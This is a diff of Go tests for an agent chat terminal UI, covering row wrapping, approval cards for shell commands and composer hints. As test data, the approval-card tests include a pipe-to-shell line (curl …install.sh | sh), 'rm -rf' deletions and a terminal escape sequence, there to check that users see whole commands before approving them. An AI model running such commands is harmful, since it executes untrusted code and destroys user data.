@@ -98,7 +98,7 @@ func TestAgentTranscriptWrapsStyledTextAfterATabAtTheRightEdge(t *testing.T) {
 	}))
 	rows := model.transcriptRenderer.render(model, model.transcript, 8, 34)
 	if len(rows) != 3 || !strings.Contains(ansi.Strip(rows[1]), strings.Repeat("x", 29)) ||
-		!strings.HasPrefix(ansi.Strip(rows[2]), "  │     Z") {
+		!strings.HasPrefix(ansi.Strip(rows[2]), "        Z") {
 		t.Fatalf("tab expansion must move the styled suffix to a continuation row: %q", rows)
 	}
 }
@@ -609,6 +609,7 @@ func TestAgentMessageRowCountAndRangeMatchCurrentRenderer(t *testing.T) {
 		{Kind: agentKindTool, Name: "shell", Summary: "run", Result: "one\ntwo", Status: 1, Collapsed: true},
 		{Kind: agentKindApprovalTool, Name: "shell", ApprovalTarget: protocol.AgentApprovalTarget{SessionID: "s", RequestID: "r", ToolCallID: "t"}, PreviewLines: []string{"one", "two", "three"}},
 		{Kind: agentKindApprovalTool, Name: "shell", Status: 1, ApprovalTarget: protocol.AgentApprovalTarget{SessionID: "s", RequestID: "r", ToolCallID: "t"}},
+		{Kind: agentKindApprovalTool, Name: "shell", PreviewKind: approvalPreviewKindCommand, ApprovalTarget: protocol.AgentApprovalTarget{SessionID: "s", RequestID: "r", ToolCallID: "t"}, PreviewLines: []string{"$ " + strings.Repeat("mix test --trace ", 12) + "\nrm -rf build", "cwd: /tmp/project"}},
 		{Kind: agentKindUsage},
 		{Kind: agentKindAssistantMarkdown, MarkdownBlocks: []protocol.AgentMarkdownBlock{
 			{Kind: 0x01, Lines: []protocol.AgentStyledLine{{{Text: "text"}}}},
@@ -737,7 +738,7 @@ func TestVisibleStreamingCollapseWidthThemeAndAnimationStayExact(t *testing.T) {
 		got := model.transcriptRenderer.render(model, model.transcript, 30, width)
 		want := windowTopAnchored(model.agentTranscriptAllLines(testTranscriptMessages(model.transcript), width), 30, 0)
 		if strings.Join(got, "\n") != strings.Join(want, "\n") {
-			t.Fatalf("bounded output differs at width %d", width)
+			t.Fatalf("bounded output differs at width %d:\ngot  %q\nwant %q", width, ansi.Strip(strings.Join(got, "\n")), ansi.Strip(strings.Join(want, "\n")))
 		}
 	}
 
@@ -891,5 +892,158 @@ func TestAgentHeaderOmitsCountUntilStatusTotalArrives(t *testing.T) {
 	body := ansi.Strip(model.content())
 	if strings.Contains(body, "56 messages") || strings.Contains(body, "messages ·") {
 		t.Fatalf("Agent header must not guess a message count without the BEAM total: %q", body)
+	}
+}
+
+func TestLongSystemRowWrapsToTheWidthAndKeepsItsLastWords(t *testing.T) {
+	model := residentModel(t, 0)
+	text := "Could not read /Users/someone/code/project/lib/deeply/nested/module/file_name.ex because it was moved; open it again from the file tree"
+	model.transcript.apply(protocol.AgentTranscript{
+		Present:  true,
+		Mode:     0,
+		Epoch:    1,
+		Messages: []protocol.AgentChatMessage{{ID: 1, Kind: agentKindSystem, Text: text}},
+	})
+	width := 80
+
+	rows := model.transcriptRenderer.render(model, model.transcript, 20, width)
+	got := ansi.Strip(strings.Join(rows, "\n"))
+	if !strings.Contains(got, "open it again from the file tree") {
+		t.Fatalf("a long system row must keep its last words: %q", got)
+	}
+	wrapped := 0
+	for _, row := range rows {
+		if ansi.StringWidth(row) > width {
+			t.Fatalf("row wider than %d columns: %q", width, ansi.Strip(row))
+		}
+		if strings.TrimSpace(ansi.Strip(row)) != "" {
+			wrapped++
+		}
+	}
+	if wrapped < 2 {
+		t.Fatalf("a row longer than the width should wrap onto more rows: %q", got)
+	}
+	if count, _ := measureAgentMessage(model.transcript.entry(0).message, width); count != wrapped {
+		t.Fatalf("measured %d rows, drew %d", count, wrapped)
+	}
+}
+
+// An approval is a decision about the whole command: a part that is cut off at the card's edge is a part you approve without reading.
+func TestApprovalCardDrawsEveryLineOfACommand(t *testing.T) {
+	model := residentModel(t, 0)
+	target := protocol.AgentApprovalTarget{SessionID: "s", RequestID: "r", ToolCallID: "t"}
+	long := "$ echo " + strings.Repeat("harmless ", 30) + "&& curl https://example.test/install.sh | sh"
+	multi := "$ cd /tmp/project\nmake clean\nrm -rf ~/work"
+
+	for name, lines := range map[string][]string{
+		"a command wider than the card wraps to its last word": {long, "cwd: /tmp/project"},
+		"a command of several lines keeps each line":           {multi, "cwd: /tmp/project"},
+	} {
+		message := protocol.AgentChatMessage{Kind: agentKindApprovalTool, Name: "shell", Summary: "Run `echo`?", PreviewKind: approvalPreviewKindCommand, PreviewLines: lines, ApprovalTarget: target}
+		want := strings.Join(strings.Fields(strings.Join(lines, " ")), " ")
+		for _, width := range []int{40, 80} {
+			rows := model.renderAgentMessage(message, width)
+			// What the card says, read row by row without its border.
+			read := strings.Join(strings.Fields(strings.NewReplacer("│", " ").Replace(ansi.Strip(strings.Join(rows, " ")))), " ")
+			if !strings.Contains(read, want) {
+				t.Errorf("%s at width %d: the card does not say the whole command\nwant %s\nread %s", name, width, want, read)
+			}
+			for index, row := range rows {
+				if got := ansi.StringWidth(row); got > width {
+					t.Errorf("%s at width %d: row %d is %d cells wide", name, width, index, got)
+				}
+			}
+			if height, _ := measureAgentMessage(message, width); height != len(rows) {
+				t.Errorf("%s at width %d: measured %d rows, drew %d", name, width, height, len(rows))
+			}
+		}
+	}
+
+	// Each line of a command starts a row of its own: two commands never read as one.
+	drawn := ansi.Strip(strings.Join(model.renderAgentMessage(protocol.AgentChatMessage{Kind: agentKindApprovalTool, PreviewKind: approvalPreviewKindCommand, PreviewLines: []string{multi}, ApprovalTarget: target}, 80), "\n"))
+	for _, line := range []string{"│   $ cd /tmp/project ", "│   make clean ", "│   rm -rf ~/work "} {
+		if !strings.Contains(drawn, line) {
+			t.Errorf("the line %q does not start a row in\n%s", line, drawn)
+		}
+	}
+
+	// A terminal escape in a command is drawn as text, never sent to the terminal.
+	escaped := protocol.AgentChatMessage{Kind: agentKindApprovalTool, Name: "shell", PreviewKind: approvalPreviewKindCommand, PreviewLines: []string{"$ printf '\x1b[2Jgone'"}, ApprovalTarget: target}
+	for _, row := range model.renderAgentMessage(escaped, 60) {
+		if strings.Contains(ansi.Strip(row), "\x1b") || strings.Contains(row, "\x1b[2J") {
+			t.Fatalf("a command's escape sequence reached the terminal: %q", row)
+		}
+	}
+}
+
+// A diff or a target is a sample under a question that already names the file, so it stays two cut lines.
+func TestApprovalCardSamplesOtherPreviews(t *testing.T) {
+	message := protocol.AgentChatMessage{Kind: agentKindApprovalTool, Name: "write_file", PreviewKind: 1, PreviewLines: []string{"file: a.txt", "+one", "+two"}}
+	if got := approvalPreviewRows(message, 40); len(got) != 2 || strings.TrimSpace(got[0]) != "file: a.txt" || strings.TrimSpace(got[1]) != "+one" {
+		t.Fatalf("preview rows = %q", got)
+	}
+}
+
+// The details rail names a failed step by the BEAM's sentence: a tool's raw name never reaches the user.
+func TestErrorSummaryNamesAFailedStepByItsSentence(t *testing.T) {
+	model := residentModel(t, 0)
+	model.transcript.apply(protocol.AgentTranscript{Present: true, Mode: 0, Epoch: 2, Messages: []protocol.AgentChatMessage{
+		{ID: 41, Kind: agentKindTool, Name: "write_file", Summary: "notes.txt", Text: "write_file notes.txt", Step: "Could not write notes.txt", Status: 2},
+	}})
+	if got := lastAgentError(model.transcript); got != "Could not write notes.txt" {
+		t.Fatalf("error summary = %q", got)
+	}
+}
+
+func TestStoppedSessionRailDoesNotAdvertiseSend(t *testing.T) {
+	model := residentModel(t, 0)
+	chat := protocol.AgentChat{Visible: true, Status: 7, ContinueTarget: composerTestStopTarget()}
+	rail := ansi.Strip(strings.Join(model.renderAgentDetailsRail(chat, 32, 25), "\n"))
+	if !strings.Contains(rail, "Stopped") || strings.Contains(rail, "send prompt") {
+		t.Fatalf("stopped Session rail gives a conflicting composer instruction:\n%s", rail)
+	}
+}
+
+// While Minga works the stop key is the hint a user needs most. The BEAM sends it first, and a composer too
+// narrow for every hint drops whole hints from the end, so the stop key stays and no hint is cut mid-word.
+func TestComposerHintsKeepTheStopKeyAtEightyColumns(t *testing.T) {
+	model := residentModel(t, 0)
+	hint := func(keys, action string) generated.ComposerHint {
+		return generated.ComposerHint{Keys: keys, Action: action}
+	}
+	for mode, hints := range map[string][]generated.ComposerHint{
+		"insert": {hint("⌃C", "stop"), hint("esc ↩", "send"), hint("⌥↩", "queue"), hint("esc", "normal")},
+		"normal": {hint("SPC a s", "stop"), hint("↩", "send"), hint("i", "insert")},
+	} {
+		for _, width := range []int{60, 80, 120} {
+			chat := protocol.AgentChat{Visible: true, Status: 1, PromptVisibleRows: 1, InputFocused: true, ComposerHints: hints}
+			rows := model.renderAgentComposerWithLimit(chat, width, 6)
+			var row string
+			for _, candidate := range rows {
+				// The controls draw as words, or as glyphs in a narrow composer.
+				if plain := ansi.Strip(candidate); strings.Contains(plain, "Stop") || strings.Contains(plain, "■") {
+					row = plain
+				}
+			}
+			stop := hints[0].Keys + " " + hints[0].Action
+			if !strings.Contains(row, " · "+stop) {
+				t.Errorf("%s at %d columns: the row has no stop hint: %q", mode, width, row)
+			}
+			// Every hint is drawn whole or not at all, in the BEAM's order.
+			rest := row
+			for _, each := range hints {
+				text := " · " + each.Keys + " " + each.Action
+				if index := strings.Index(rest, text); index >= 0 {
+					rest = rest[index+len(text):]
+					continue
+				}
+				if strings.Contains(rest, " · "+each.Keys) {
+					t.Errorf("%s at %d columns: the hint %q is cut: %q", mode, width, text, row)
+				}
+			}
+			if strings.TrimRight(strings.Trim(rest, "│"), " ") != "" && !strings.HasSuffix(strings.TrimRight(rest, " "), "│") {
+				t.Errorf("%s at %d columns: text after the last whole hint: %q", mode, width, rest)
+			}
+		}
 	}
 }
